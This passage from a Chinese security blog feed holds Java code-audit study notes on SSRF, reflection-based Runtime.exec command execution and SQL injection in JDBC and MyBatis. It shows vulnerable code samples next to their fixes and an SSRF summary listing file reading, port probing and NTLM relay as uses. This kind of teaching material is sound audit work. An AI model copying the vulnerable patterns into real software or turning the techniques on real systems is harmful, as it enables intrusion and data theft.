class="line">URL.openStream</span><br><span class="line">Request.Get(url).execute()</span><br></pre></td></tr></table></figure><p>HttpClients漏洞示例</p><p>我后来改成这个做了爬虫，这个感觉兼容性不错的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">CloseableHttpClient client &#x3D; HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet &#x3D; new HttpGet(url);</span><br><span class="line">&#x2F;&#x2F;发起请求</span><br><span class="line">HttpResponse httpResponse &#x3D; client.execute(httpGet);</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><ul><li><p>限制协议为HTTP、HTTPS协议。</p></li><li><p>禁止URL传入内网IP或者设置URL白名单。</p></li></ul><p>302跳转这个问题是，Java会默认跟随跳转，但是跳转是有协议限制的，gopher都不行，所以限制上面那些就可以了。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>总的来说，Java的SSRF 漏洞比较受到限制，而且大家也比较少用原生的，封装过的用多一些？</p><p>大概率只能：</p><ul><li>利用file协议任意文件读取 （限制在URLConnection这种方式）</li><li>利用http协议端口探测</li><li>利用 http 进行 ntlmrelay 攻击 （这种大家自己研究一下吧。。。）</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>凌天实验室–园长 Github <a href="https://github.com/anbai-inc/javaweb-sec" target="_blank" rel="noopener">javaweb-sec</a></p><p><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">https://joychou.org/java/javassrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计自学:反射机制</title>
      <link href="/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>主要是因为自己的学习Java 代码审计中的学习思路吧，主要自己一个人学习，有点闭门造车，百度学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><p>P牛的文章中说到：</p><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。</p><h1 id="0x01-Java反射机制"><a href="#0x01-Java反射机制" class="headerlink" title="0x01 Java反射机制"></a>0x01 Java反射机制</h1><p>我之前觉得Java学起来感觉是比较死的，因为我只是站在变成的角度，php的各种动态的调用，免杀起来都方便的不行，但是发现java的提供的“反射”功能，也是可以提供⼀些动态特性，也是灵活的</p><p>所以，Java反射(<code>Reflection</code>)是Java非常重要的动态特性</p><p>我们通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息</p><p>还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><p>简单的说就是，我们用对象可以通过反射获取他的类，用类可以通过拿到它的所有⽅法（包括私有），拿到的⽅法可以为所欲为？？</p><h1 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h1><h2 id="⼏个在反射⾥极为重要的⽅法："><a href="#⼏个在反射⾥极为重要的⽅法：" class="headerlink" title="⼏个在反射⾥极为重要的⽅法："></a><strong>⼏个在反射⾥极为重要的⽅法：</strong></h2><h3 id="1-获取class的字节码对象："><a href="#1-获取class的字节码对象：" class="headerlink" title="1.获取class的字节码对象："></a><strong>1.获取class的字节码对象</strong>：</h3><p>Java反射操作的是<code>java.lang.Class</code>对象，所以我们需要先想办法获取到Class对象，通常我们有如下几种方式获取一个类的Class对象：</p><ol><li><p><code>类名.class</code>，如:<code>com.zeo.sec.Test.class</code>。如果你已经加载了某个类，那么就直接拿它的 class 属性</p></li><li><p><code>Class.forName(&quot;com.zeo.sec.Test.class&quot;)</code>。如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</p></li><li><p><code>classLoader.loadClass(&quot;com.zeo.sec.Test.class&quot;);</code></p></li><li><p><code>obj.getClass()</code>如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类</p></li></ol><p><strong>以最常用的代码执行获取Runtime类Class对象代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String className     = <span class="string">"java.lang.Runtime"</span>;</span><br><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure><h3 id="2-获取名字"><a href="#2-获取名字" class="headerlink" title="2.获取名字"></a><strong>2.获取名字</strong></h3><p>可以反射类名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getName()//获取全名 例如：com.test.Demo</span><br><span class="line"></span><br><span class="line">getSimpleName()//获取类名 例如：Demo</span><br></pre></td></tr></table></figure><h3 id="3-获取构造函数"><a href="#3-获取构造函数" class="headerlink" title="3.获取构造函数"></a><strong>3.获取构造函数</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getConstructors()//获取所有公开的构造函数</span><br><span class="line"></span><br><span class="line">getConstructor(参数类型)//获取单个公开的构造函数</span><br><span class="line"></span><br><span class="line">getDeclaredConstructors()//获取所有构造函数</span><br><span class="line"></span><br><span class="line">getDeclaredConstructor(参数类型)//获取一个所有的构造函数</span><br></pre></td></tr></table></figure><p><strong>获取当前类所有的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = clazz.getDeclaredMethods()</span><br></pre></td></tr></table></figure><p><strong>获取当前类指定的成员方法：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method method = clazz.getDeclaredMethod(<span class="string">"方法名"</span>);</span><br><span class="line">Method method = clazz.getDeclaredMethod("方法名", 参数类型如String.class，多个参数用","号隔开);</span><br></pre></td></tr></table></figure><h3 id="4-实例化类对象的⽅法：-newInstance（）"><a href="#4-实例化类对象的⽅法：-newInstance（）" class="headerlink" title="4.实例化类对象的⽅法： newInstance（）"></a>4.实例化类对象的⽅法： newInstance（）</h3><p>class.newInstance() 的作用就是调用这个类的无参构造函数，如果使用 newInstance 总是不成功，这时候原因可能是：</p><ol><li><p>你使用的类没有无参构造函数 （getConstructor方法解决）</p></li><li><p>你使用的类构造函数是私有的 （getDeclaredConstructor方法解决）</p></li></ol><h3 id="5-反射调用方法执⾏函数的⽅法：-invoke"><a href="#5-反射调用方法执⾏函数的⽅法：-invoke" class="headerlink" title="5.反射调用方法执⾏函数的⽅法： invoke"></a>5.反射调用方法执⾏函数的⽅法： invoke</h3><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p><p><strong>调用类方法代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">","</span>隔开);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke 的作用是执行方法，它的第一个参数是：</span><br><span class="line">如果这个方法是一个普通方法，那么第一个参数是 类的实例对象</span><br><span class="line">如果这个方法是一个静态方法，那么第一个参数是 类</span><br></pre></td></tr></table></figure><h1 id="0x03-特殊情况"><a href="#0x03-特殊情况" class="headerlink" title="0x03 特殊情况"></a>0x03 特殊情况</h1><h2 id="如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类"><a href="#如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类" class="headerlink" title="如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类"></a>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类</h2><p>使用新的反射方法 getConstructor</p><p>getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。<br>获取到构造函数后，我们使用 newInstance 来执行。<br>比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用start() 来执行命令</p><h2 id="如果一个方法或构造方法是私有方法，我们是否能执行它呢"><a href="#如果一个方法或构造方法是私有方法，我们是否能执行它呢" class="headerlink" title="如果一个方法或构造方法是私有方法，我们是否能执行它呢"></a>如果一个方法或构造方法是私有方法，我们是否能执行它呢</h2><p><strong>普通的 getMethod 、getDeclaredMethod 区别是：</strong><br>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法<br>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</p><p>getDeclaredConstructor和getConstructor都可以获取到类构造方法，区别在于：</p><p>getConstructor无法获取到私有方法，所以一般在获取某个类的构造方法时候我们会使用getDeclaredConstructor去获取构造方法。如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：<code>clazz.getDeclaredConstructor(String.class, String.class)</code>。</p><p>举个例子，前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例化对象，进而执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(IOUtils.toString(in, <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>反射调用<code>Runtime</code>实现本地命令执行的流程如下：</p><ol><li>反射获取<code>Runtime</code>类对象(<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)。</li><li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li><li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)。</li><li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P牛知识星球中的java漫谈</p><p>凌天实验室：<a href="https://mp.weixin.qq.com/s/SA\_M0yQiCh8nM0qL2xwT-A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/SA\_M0yQiCh8nM0qL2xwT-A</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计自学：sql注入篇</title>
      <link href="/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>主要是因为自己的学习Java 代码审计中的学习思路吧，主要自己一个人学习，有点闭门造车，百度学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>虽然基础，但是还是介绍一下吧</p><p>SQL 注入老生常谈，就是 SQL 命令插入请求中，并在服务器端被接收后用，没有有效的过滤，导致服务器执行了意料之外的恶意的 SQL 命令，最终达到恶意的脱数据。</p><p>Java 的 SQL 注入和 PHP 中的 SQL 注入，其实原理都是一样的，理论上只要是与数据库存在数据交互，只要传入的数据完全受用户控制，没有有效的过滤都有可能出现 SQL 注入的。</p><p>java的特殊是有一些框架会托管一部分的数据库的操作，我们要了解一下</p><h1 id="0x02-分类：拼接和预编译"><a href="#0x02-分类：拼接和预编译" class="headerlink" title="0x02 分类：拼接和预编译"></a>0x02 分类：拼接和预编译</h1><h2 id="1、直接拼接，未进行过滤"><a href="#1、直接拼接，未进行过滤" class="headerlink" title="1、直接拼接，未进行过滤"></a>1、直接拼接，未进行过滤</h2><p>将<code>request.getParameter(&quot;id&quot;)</code>获取的id直接放在SQL语句，没有过滤而且是拼接的情况</p><p>以前的JDBC的方式，的直接拼接方式，存在sql注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request.getParameter(&quot;userId&quot;)</span><br><span class="line"></span><br><span class="line">private String getNameByUserId(String userId) &#123;</span><br><span class="line">    Connection conn &#x3D; getConn();&#x2F;&#x2F;获得连接</span><br><span class="line">    String sql &#x3D; &quot;select name from user where id&#x3D;&quot; + userId;</span><br><span class="line">    PreparedStatement pstmt &#x3D;  conn.prepareStatement(sql);</span><br><span class="line">    ResultSet rs&#x3D;pstmt.executeUpdate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局搜索查看：<code>=&quot;</code>或者<code>sql</code>的问题</p><p><strong>防止措施，修复方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;安全的，预编译的，防止了sql注入</span><br><span class="line">Connection conn &#x3D; getConn();&#x2F;&#x2F;获得连接</span><br><span class="line">String sql &#x3D; &quot;select id, username, password, role from user where id&#x3D;?&quot;; &#x2F;&#x2F;执行sql前会预编译号该条语句</span><br><span class="line">PreparedStatement pstmt &#x3D; conn.prepareStatement(sql); </span><br><span class="line">pstmt.setString(1, id); </span><br><span class="line">ResultSet rs&#x3D;pstmt.executeUpdate();</span><br></pre></td></tr></table></figure><h2 id="2、Mybatis和Hibernate-框架"><a href="#2、Mybatis和Hibernate-框架" class="headerlink" title="2、Mybatis和Hibernate 框架"></a>2、Mybatis和Hibernate 框架</h2><p>主要是预编译的错误使用</p><p>框架主要都是使用注解或者xml将java对象与数据库sql操作对应。</p><p>下面以 Mybatis 讲解一下</p><ul><li>mybatis的maven配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.5.2&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><ul><li>config.xml 配置数据库连接的文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE configuration</span><br><span class="line">        PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot;</span><br><span class="line">        &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;environments default&#x3D;&quot;dev&quot;&gt;</span><br><span class="line">        &lt;environment id&#x3D;&quot;dev&quot;&gt;</span><br><span class="line">            &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt;</span><br><span class="line">            &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.cj.jdbc.Driver&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;url&quot;</span><br><span class="line">                          value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatistest&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;dataSource&gt;</span><br><span class="line">        &lt;&#x2F;environment&gt;</span><br><span class="line">    &lt;&#x2F;environments&gt;</span><br><span class="line">    &lt;mappers&gt;</span><br><span class="line">        &lt;mapper resource&#x3D;&quot;UserMapper.xml&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;mappers&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure><p>主要注意的点！</p><ul><li>UserMapper.xml</li></ul><p>正常预编译</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByNameAndPassword"</span> <span class="attr">parameterType</span>=<span class="string">"java.util.Map"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">select id, username, password, role</span><br><span class="line">from user</span><br><span class="line">where username = #&#123;username,jdbcType=VARCHAR&#125;</span><br><span class="line">and password = #&#123;password,jdbcType=VARCHAR&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>存在漏洞的预编译</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByNameAndPassword"</span> <span class="attr">parameterType</span>=<span class="string">"java.util.Map"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">select id, username, password, role</span><br><span class="line">from user</span><br><span class="line">where username = $&#123;username,jdbcType=VARCHAR&#125;</span><br><span class="line">and password = $&#123;password,jdbcType=VARCHAR&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="和-的区别："><a href="#和-的区别：" class="headerlink" title="#和$的区别："></a><strong>#和$的区别：</strong></h3><p>1、#将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号，正确的预编译，输入的参数会全部变成查询的部分</p><p>2、 将 传 入 的 数 据 直 接 拼 接 在 s q l 中 。 造 成 s q l 注 入 如 ： w h e r e u s e r n a m e = 将传入的数据直接拼接在sql中。造成sql注入 如：where username= 将传入的数据直接拼接在sql中。造成sql注入如：whereusername={username}，如果传入的值是111,那么解析成sql时的值为where username=111；<br>如果传入的值是1 and 1=1 ;，则解析成的sql为：select id, username, password, role from user where username=1 and 1=1</p><h1 id="0x03-MyBatis框架易产生SQL注入漏洞的三种情况："><a href="#0x03-MyBatis框架易产生SQL注入漏洞的三种情况：" class="headerlink" title="0x03 MyBatis框架易产生SQL注入漏洞的三种情况："></a>0x03 MyBatis框架易产生SQL注入漏洞的三种情况：</h1><h2 id="1、模糊查询"><a href="#1、模糊查询" class="headerlink" title="1、模糊查询"></a>1、模糊查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title like ‘%#&#123;title&#125;%’</span><br></pre></td></tr></table></figure><p>在这种情况下使用#程序会报错，新手程序员就把#号改成了$,这样如果java代码层面没有对用户输入的内容做处理势必会产生SQL注入漏洞。</p><p>正确写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where tile like concat(‘%’,#&#123;title&#125;, ‘%’)</span><br></pre></td></tr></table></figure><h2 id="2、in-之后的多个参数"><a href="#2、in-之后的多个参数" class="headerlink" title="2、in 之后的多个参数"></a>2、in 之后的多个参数</h2><p>in之后多个id查询时使用# 同样会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where id in (#&#123;ids&#125;)</span><br></pre></td></tr></table></figure><p>正确用法为使用foreach，而不是将#替换为$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id in&lt;foreach collection&#x3D;&quot;ids&quot; item&#x3D;&quot;item&quot; open&#x3D;&quot;(&quot;separatosr&#x3D;&quot;,&quot; close&#x3D;&quot;)&quot;&gt;#&#123;ids&#125; &lt;&#x2F;foreach&gt;</span><br></pre></td></tr></table></figure><h2 id="3、order-by-之后"><a href="#3、order-by-之后" class="headerlink" title="3、order by 之后"></a>3、order by 之后</h2><p>默认情况下，使用＃{}格式的语法会导致MyBatis的创建的PreparedStatement参数并安全地设置参数（就像使用？一样）。这样做更安全，更迅速，通常也是首选做法。</p><p>当根据发布时间、点击量等信息对新闻进行排序的时候，如果考虑安全编码规范问题，其对应的SQL语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title &#x3D;‘123’ order by #&#123;time&#125; asc</span><br></pre></td></tr></table></figure><p>但由于发布时间time不是用户输入的参数，无法使用预编译。研发人员将SQL查询语句修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title &#x3D;‘123’ order by $&#123;time&#125; asc</span><br></pre></td></tr></table></figure><p>修改之后，程序通过预编译，但是产生了SQL语句拼接问题，极有可能引发SQL注入漏洞。</p><p>不过有时你就是想直接在SQL语句中插入一个不转义的字符串。比如，像ORDER BY，你可以这样来使用：ORDER BY $ {COLUMNNAME}。这里的MyBatis不会修改或者转义字符串。</p><p>需要注意的是在mybatis-generator自动生成的SQL语句中，order by使用的也是$，而like和in没有问题。</p><h1 id="0x04-Hibernate防止SQL注入"><a href="#0x04-Hibernate防止SQL注入" class="headerlink" title="0x04 Hibernate防止SQL注入"></a><strong>0x04 Hibernate防止SQL注入</strong></h1><p><strong>对参数名称进行绑定</strong>在HQL语句中定义命名参数要用”:”开头，形式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Query query&#x3D;session.createQuery(“from User user where user.name&#x3D;:customername and user:customerage&#x3D;:age ”); </span><br><span class="line">query.setString(“customername”,name); </span><br><span class="line">query.setInteger(“customerage”,age);</span><br></pre></td></tr></table></figure><p><strong>按参数位置邦定：</strong><br>在HQL查询语句中用”?”来定义参数位置，形式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Query query&#x3D;session.createQuery(“from User user where user.name&#x3D;? and user.age &#x3D;? ”); </span><br><span class="line">query.setString(0,name); </span><br><span class="line">query.setInteger(1,age);</span><br></pre></td></tr></table></figure><p><strong>setParameter()方法： ,</strong><br>在Hibernate的HQL查询中可以通过setParameter()方法邦定任意类型的参数，如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String hql&#x3D;”from User user where user.name&#x3D;:customername ”; </span><br><span class="line">Query query&#x3D;session.createQuery(hql); </span><br><span class="line">query.setParameter(“customername”,name,Hibernate.STRING);</span><br></pre></td></tr></table></figure><p><strong>setProperties()方法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Entity entity&#x3D;new Entity();</span><br><span class="line">entity.setXx(“xx”);</span><br><span class="line">entity.setYy(100);</span><br><span class="line">Query query&#x3D;session.createQuery(“from Entity c where c.xx&#x3D;:xx and c.yy&#x3D;:yy ”); </span><br><span class="line">query.setProperties(entity);</span><br></pre></td></tr></table></figure><h1 id="0x05-挖掘方法"><a href="#0x05-挖掘方法" class="headerlink" title="0x05 挖掘方法"></a>0x05 挖掘方法</h1><p>使用idea 搜索$关键字</p><p>可以先筛选xml文件搜索$,逐个分析，要特别注意mybatis-generator的order by注入</p><p>Ctrl+shift+F 调出Find in Path，筛选后缀xml，搜索$关键字</p><p>找到是mybatis的数据库文件</p><p>找到调用函数后，alt+f7查看调用链，检查中间是否被过滤</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制漏洞：从简单栈溢出到写自己编写shellcode</title>
      <link href="/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/"/>
